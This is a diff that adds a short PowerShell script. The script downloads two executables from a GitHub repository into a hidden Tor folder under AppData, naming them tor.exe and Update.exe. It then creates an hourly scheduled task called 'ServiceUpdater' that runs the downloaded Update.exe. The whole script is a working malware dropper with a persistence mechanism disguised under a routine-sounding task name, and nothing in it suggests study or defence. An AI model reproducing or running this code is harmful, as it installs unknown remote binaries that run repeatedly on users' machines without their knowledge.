@@ -1,0 +1,9 @@
+New-Item -ItemType dir -Path "$env:APPDATA\Tor" -Force
+$outfile1 = "$env:APPDATA\Tor\tor.exe"
+$outfile2 = "$env:APPDATA\Tor\Update.exe"
+(New-Object Net.WebClient).DownloadFile("https://github.com/jawandapreeti/urban-octo-potato/raw/main/t.235",$outfile1)
+(New-Object Net.WebClient).DownloadFile("https://github.com/jawandapreeti/urban-octo-potato/raw/main/u.235",$outfile2)
+$currentDateTime = Get-Date
+$newDateTime = $currentDateTime.AddMinutes(5)
+$newTime = $newDateTime.ToString("HH:mm")
+schtasks /Create /TN "ServiceUpdater" /SC HOURLY /TR "%APPDATA%\Tor\Update.exe" /ST $newTime /f
